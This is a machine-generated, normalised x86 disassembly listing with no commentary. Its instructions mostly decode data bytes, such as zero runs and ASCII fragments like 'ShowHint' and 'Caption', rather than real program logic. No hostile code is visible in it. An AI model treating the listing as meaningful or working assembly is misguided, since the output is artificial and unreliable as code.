add [ esi + ecx * 2 + 0x70043 ] dh
cmp esi [ eax - 0x4fef4fee ]
xor dh [ eax - 0x4fc7ffb9 ]
0x20ff
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add ah bh
and al 0x45
add al dh
adc al [ ebp ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x27 ] bh
inc ebx
add [ edi + 0x2240043 ] ah
add [ eax ] al
inc eax
bound eax [ eax + eax + 0x34 ]
pop es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4327 ] bh
insb
jae r-xdata
adc [ eax ] eax
add eax 0x6c797453
add [ gs : eax ] dl
inc eax
add [ edi ] dl
add bh bh
fcomp [ esi - 0x3fcbffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x90656c62
cwde
and eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fsub [ 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4325 0x0
shl [ r-xdata ] 0x1
add [ eax ] al
pushfd
mov es [ ecx ]
xor al 0x7
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
test [ edx + 0x43 ] cl
add [ esp + ebp * 4 + 0x33c0041 ] ch
inc edx
add al cl
stosd [ edi ]
inc ecx
add [ esp + eax ] dl
inc edx
add al ah
add al [ edx ]
and al 0x4
inc edx
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ edx + ecx * 2 ] dh
inc ebx
add [ ecx ] al
add bh ch
push esp
dec ebx
inc ebx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x25dc9072
inc ebx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x43259872
add [ eax + 0x500418f ] bl
add [ eax ] cl
inc ebp
js r-xdata
outsb
je r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] bl
jecxz r-xdata
xor al 0x7
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax ] cl
dec esp
inc ebx
add [ esi + ecx ] al
inc ebp
add [ edx + edx * 2 + 0x43 ] bl
inc eax
add [ eax ] al
add bh bh
mov esp 0x100434b
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add bh bh
int3
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
outsd
add [ eax ] al
add [ eax + 0x430b000d ] al
mov eax [ 0xffffffffa0d00044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
and al [ ebx ]
imul eax [ ecx ] 0x4660ff00
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x70616853 ]
add [ gs : eax ] dl
inc eax
add [ ecx + 0x8ff0000 ] bl
sub_4327e0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
sub [ ebx ] al
sub [ edx ] al
add [ eax ] al
pushad
inc ebx
add [ edi + eax ] dh
add [ edx + edx + 0x45 ] ch
add ah bh
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add al cl
push eax
inc ebx
add [ eax + 0x400044ce ] ah
fadd [ eax + eax - 0x34 ]
dec esp
inc ebx
add [ eax ] ch
fld [ eax + eax + 0x58 ]
xlat
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x45 ] cl
add [ eax + 0x30004352 ] cl
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ esi + ecx * 2 + 0x54060043 ] dh
push eax
popad
outsb
insb
nop
add [ ecx ] ch
inc ebx
add [ edi ] al
push es
push esp
push eax
popad
outsb
insb
sub [ eax ] ch
inc ebx
add [ edi + r-xdata ] dh
or [ ebp + 0x78 ] al
je r-xdata
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add ah bh
and al 0x45
add al dh
adc al [ ebp ]
loopne r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
js r-xdata
je r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] bl
jecxz r-xdata
xor al 0x7
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ eax ] cl
dec esp
inc ebx
add [ esi + ecx ] al
inc ebp
add [ edx + edx * 2 + 0x43 ] bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
inc esp
add [ ecx ] ah
add bh bh
or al 0x93
inc esp
add [ eax + 0x4493 ] ch
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
pop esp
add [ eax ] al
insb
jae r-xdata
add [ eax ] al
adc [ edx ] 0x0
insb
dec ecx
outsb
outsb
jb r-xdata
add bh bh
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
pushfd
jpo r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ edx ] eax
add bh bh
cmp al 0x50
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
add [ eax + 0x46 ] dl
inc esp
add [ ebx ] bl
add bh bh
int3
add [ eax ] al
call [ esi ]
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
adc [ eax ] al
pop esp
inc esp
add [ edx ] dl
add al [ eax ]
[ eax + 0x50 ]
inc ebx
add [ ecx ] al
adc eax [ eax ]
or eax [ edx + 0x6f ]
add [ eax ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
push edi
add [ edi ] bl
add bh bh
jo r-xdata
popad
dec esi
inc esp
add [ eax + eax ] dh
dec [ esp + eax * 8 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
add [ 0x6f6c6f43 ] al
jb r-xdata
add [ ecx + 0x44 ] dh
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jb r-xdata
add [ ebx ] dl
add [ ebx ] cl
inc edx
outsd
insb
dec edi
jne r-xdata
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x5bf06564
inc esp
add [ eax ] bl
add al [ eax ]
call [ eax + 0x1004350 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
inc ebx
jb r-xdata
add dh bh
fsub [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
adc al [ eax ]
inc ebx
jne r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ edi + 0x6cff0001 ] ah
or al [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
inc esp
jb r-xdata
sbb al 0x2
add bh bh
lodsb [ esi ]
push eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
[ 0x1ff0002 ]
jae r-xdata
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x18ff0001 ] ah
or [ ebp ] eax
cmp al 0x9
inc ebp
or al [ edx + 0x65 ]
jbe r-xdata
pop esp
inc esp
add [ edx + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
insb
and [ gs : ebp + 0x44 ] cl
add [ eax - 0x17ffbb61 ] bh
lahf
inc esp
add [ edi + edi * 4 + 0x44 ] dh
add [ eax - 0x80000000 ] al
adc eax 0x61430700
jo r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add al bl
sbb [ ebp ] eax
mov esp 0x1ffe0000
add al [ eax ]
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50100023 ] al
popad
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
adc [ eax ] al
test al 0x1
add bh bh
jl r-xdata
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_421698
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0xacff0000
mov al [ 0xffffffffa0bc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x38 ] 0x7a004446
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
dec esp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
cmp [ gs : esi + 0x44 ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add bh bh
push ss
add bh bh
pop eax
mov eax [ 0xffffffffa1740044 ]
inc esp
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
add [ ecx ] 0x0
add [ eax ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
fcomp [ ecx ]
inc ebp
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
outsb
je r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
outsb
xor [ eax ] 0x0
jpe r-xdata
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc ebp
fcomp [ esi - 0x3fcbffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8656c62
push esp
inc esp
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
jo r-xdata
adc [ eax ] al
0x2cff0000 0x44a1
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
jl r-xdata
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
js r-xdata
add [ eax ] al
in al 0x7c
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
popad
outsb
push edx
jae r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edx + ecx ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
in al 0xa0
inc esp
add [ ecx ] al
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ ebp ] eax
hlt
push 0x6948776f
outsb
je r-xdata
and eax 0x61500b00
jb r-xdata
adc [ eax ] al
test eax 0x48ff0001
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
call 0xffffffffe9422efe
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
enter 0x4450 0x0
push eax
outsd
jo r-xdata
adc [ eax ] al
adc [ eax ] al
push edi
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax ]
mov eax [ 0xffffffffa0d00044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080029 ] al
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
daa
add [ esi ] cl
xchg ebp eax
inc ebp
add [ eax + eax ] bh
push [ eax - 0x61 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090028 ] al
inc edi
je r-xdata
in al 0x7c
inc ecx
jl r-xdata
jo r-xdata
add [ eax ] al
jo r-xdata
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sub al [ eax ]
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
add ah dh
dec ebp
inc esp
add [ ecx + ecx + 0x45 ] dh
fmul [ esi + 0x44 ]
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0xdc6f666e
dec esi
inc esp
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
push ebx
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
add al al
add [ eax ] eax
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x70 ] bp
push ecx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
push ecx
inc esp
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
push ebx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jl r-xdata
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
jo r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
xor al [ ebx ]
xor [ edx ] dh
inc ebx
add [ edx + eax ] ah
jb r-xdata
push esp
dec edi
inc esp
add al bl
add [ eax ] al
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
dec ecx
outsb
outsw
fmul [ esi + 0x44 ]
add al cl
add [ eax ] eax
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or cl [ edi + 0x6e ]
push edx
inc esp
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ esi + edx * 2 + 0x43 ] dh
add al dh
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
add ah bl
mov bl 0x43
add [ edi + eax ] dh
inc esp
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060039 ] al
outsb
inc ebp
js r-xdata
push ecx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
mov al 0x34
inc eax
add [ eax ] bl
je r-xdata
xor al 0x7
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + edi * 8 - 0x315fffbd ] dl
inc esp
add [ eax - 0x24 ] al
inc esp
add al dh
stc
inc ebx
add [ eax ] ch
fld [ eax + eax + 0x58 ]
xlat
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x45 ] cl
add al ah
sbb [ ebp ] eax
xor [ eax * 2 + 0x45075800 ] al
add [ eax ] al
cli
inc ebx
add [ ebx + ebx * 2 + 0x43 ] cl
add [ 0xeb00c00 ] al
mov al 0x5
add ch bh
push [ esi + 0x435ae4ff ]
add [ ebx + ebx * 2 ] ah
inc ebx
add [ eax ] bh
pop ebx
inc ebx
add [ eax + 0x5b ] dl
inc ebx
add al al
push esi
inc ebx
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc esp
add al cl
stosd [ edi ]
inc ecx
add al dl
pop eax
inc ebx
add [ eax - 0x1bffbb6c ] cl
pop eax
inc ebx
add [ eax + 0x4c00449d ] ah
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add ah ah
push ebp
inc ebx
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
mov al 0x34
inc eax
add [ eax ] bl
jb r-xdata
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003d ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or cl [ edi + 0x6e ]
jl r-xdata
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ esi + edx * 2 + 0x43 ] dh
add al dh
adc al [ ebp ]
loopne r-xdata
jecxz r-xdata
inc edx
add [ eax + 0x18004034 ] dh
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov eax eax
dec eax
xor al [ ebx ]
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
adc al [ ebp ]
loopne r-xdata
inc esp
jb r-xdata
je r-xdata
add [ eax ] al
fdiv [ ebx + 0x7340043 ]
push edx
inc esp
push ebp
jo r-xdata
popad
add [ eax ] ch
add [ eax ] eax
[ eax ]
call 0xffffffffb44378cf
mov edi 0x44
inc ebx
je r-xdata
xor al 0x7
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add [ ecx - 0x3d0bffbc ] dh
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + edi * 8 - 0x315fffbd ] dl
inc esp
add [ eax - 0x24 ] al
inc esp
add al dh
stc
inc ebx
add [ eax ] ch
fld [ eax + eax + 0x58 ]
xlat
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x45 ] cl
add al ah
sbb [ ebp ] eax
xor [ eax * 2 + 0x45075800 ] al
add [ eax ] al
cli
inc ebx
add [ ebx + ebx * 2 + 0x43 ] cl
add [ ebx ] cl
push esp
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
pushfd
xor eax [ ebx ]
pop es
or edx [ edx + edx * 2 + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
mov esp 0x44004332
xor al [ ebx ]
das
add [ eax ] cl
inc ebp
js r-xdata
inc esp
add al cl
stosd [ edi ]
inc ecx
add al dl
pop eax
inc ebx
add [ eax - 0x1bffbb6c ] cl
pop eax
inc ebx
add [ eax + 0x4c00449d ] ah
pop es
inc edx
add [ esp + eax ] dh
outsd
insd
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
inc eax
xor [ ebx ] eax
and [ ebp + 0xb0043 ] dh
or [ ebp + 0x78 ] al
je r-xdata
jecxz r-xdata
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
les edx [ bp + si + 0x44 ]
jl r-xdata
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] sub_421698
jo r-xdata
add [ eax - 0x80000000 ] al
push cs
add [ edi ] al
inc ebx
popad
jo r-xdata
lahf
inc esp
add [ edi + edi * 4 + 0x44 ] dh
insb
jae r-xdata
je r-xdata
je r-xdata
add al bh
add [ eax ] al
add bh bh
pop eax
mov eax [ 0xffffffffa1740044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ 0xfff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ecx ] ah
add bh bh
or al 0x93
inc esp
add [ eax + 0x4493 ] ch
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax + 0x46 ] dl
inc esp
add [ ebx ] bl
add bh bh
int3
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add ah ah
push ebp
inc ebx
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
insb
jae r-xdata
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x40 ] bp
xor [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
xor al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edx ] dh
inc ebx
add [ eax ] dh
xor al [ ebx ]
and al 0x2
dec edi
outsd
arpl [ ebx + 0x28 ] bp
xor ah 0xff
adc [ eax ] al
sbb al 0x2
add bh bh
dec eax
pop ecx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
pop es
inc ebx
outsd
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
pushfd
jpo r-xdata
